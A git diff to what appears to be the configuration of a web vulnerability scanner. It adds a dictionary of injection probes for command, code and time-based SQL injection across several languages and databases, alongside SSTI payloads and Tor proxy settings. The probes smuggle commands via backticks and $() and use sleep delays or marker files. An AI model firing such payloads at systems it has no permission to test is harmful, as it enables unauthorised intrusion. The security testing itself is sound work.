@@ -215,6 +215,44 @@ js_exposed_secrets_regexs={
 ssti_list=["{{payload}}","{payload}","@(payload)","${payload}","#{payload}","${{payload}}","#{{payload}}","<%= payload %>","#{set} ($run= payload ) $run","#set ($run= payload ) $run "]
 
 
+rce_payloads={
+        "command": {
+            "linux": {
+                "file": ["touch {}.txt", "`touch {}.txt`", "$(touch {}.txt)"],
+                "time": ["sleep {}", "`sleep {}`", "$(sleep {})"],
+            },
+            "windows": {"file": ["copy nul {}.txt"], "time": ["ping -n {} 127.0.0.1"]},
+        },
+        "code": {
+            "python": {
+                "file": [" open('{}.txt', 'w') "],
+                "time": [" __import__('time').sleep({}) "],
+            },
+            "php": {
+                "file": [" file_put_contents('{}.txt', '') "],
+                "time": [" sleep({}) "],
+            },
+            "ruby": {"file": [' File.new("{}.txt", "w") '], "time": [" sleep({}) "]},
+            "perl": {
+                "file": [' open ( my $fh, ">", "{}.txt") '],
+                "time": [" sleep({}) "],
+            },
+            "js": {
+                "file": [" require('fs').createWriteStream('{}.txt', {flags: 'w'})  "],
+                "time": [
+                    " (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) ",
+                    " await (function wait(ms){var start = new Date().getTime();var end = start;while(end < start + ms) {end = new Date().getTime();}})({}*1000) ",
+                ],
+            },
+        },
+        "sql": {
+            "mysql": {"time": [" sleep({}) "]},
+            "oracle": {"time": [" dbms_lock.sleep({}) "]},
+            "postgre": {"time": [" pg_sleep({}) "]},
+            "sql_server": {"time": [" WAITFOR DELAY '00:00:{}' "]},
+        },
+    }
+
 default_tor_socks5_proxy_linux={'http': 'socks5h://127.0.0.1:9050', 'https': 'socks5h://127.0.0.1:9050'}
 
 default_tor_socks5_proxy_windows={'http': 'socks5h://127.0.0.1:9150', 'https': 'socks5h://127.0.0.1:9150'}
